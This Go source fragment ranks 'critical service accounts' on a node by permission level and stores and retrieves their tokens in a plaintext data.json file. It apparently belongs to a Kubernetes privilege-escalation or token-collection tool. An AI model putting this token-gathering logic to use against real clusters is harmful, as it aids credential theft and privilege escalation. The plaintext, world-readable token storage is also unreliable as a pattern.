	//fmt.Print("check")
	result := []filter{}
	flag := false
	for _, pt := range permissionTypes {
		for _, criticalSA := range criticalSAs {
			//fmt.Println(criticalSA.Type, pt)
			for _, criticalType := range criticalSA.Type {
				if strings.Contains(strings.ToUpper(criticalType), strings.ToUpper(pt)) && criticalSA.InNode == true {
					flag = true
					tmpcriticalSA := structure.CriticalSAWrapper{
						Type:  criticalType,
						Crisa: criticalSA,
					}
					result = append(result, filter{Level: criticalSA.Level, SA: tmpcriticalSA})
					break
				}
			}
		}
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].Level < result[j].Level
	})
	return flag, result
}

// 写入时指定name-type-token；读取时只需要指定期望的permissionType
func PersistToken(operator string, saName string, permissionType string, token string) interface{} {
	fileName := "data.json"
	fields := make([]map[string]interface{}, 0)
	data, _ := ioutil.ReadFile(fileName)
	err := json.Unmarshal(data, &fields)
	if err != nil {
		log.Fatal(err)
	}

	if operator == "write" {
		token := &structure.SAtoken{
			SaName:         saName,
			PermissionType: permissionType,
			Token:          token,
		}
		tp := reflect.TypeOf(token).Elem()
		vp := reflect.ValueOf(token).Elem()
		field := make(map[string]interface{}, 0)
		for i := 0; i < tp.NumField(); i++ {
			field1 := tp.Field(i)
			field2 := vp.Field(i)
			key := field1.Tag.Get("json")
			field[key] = field2.Interface()
		}
		fields = append(fields, field)
		out, _ := json.Marshal(fields)
		_ = ioutil.WriteFile(fileName, out, 0755)
		return ""
	}
	if operator == "read" {
		//fmt.Print(fields)
		for _, token := range fields {
			if token["type"] == permissionType {
				return token["token"]
			}
		}
		return ""
	}
	return ""
}
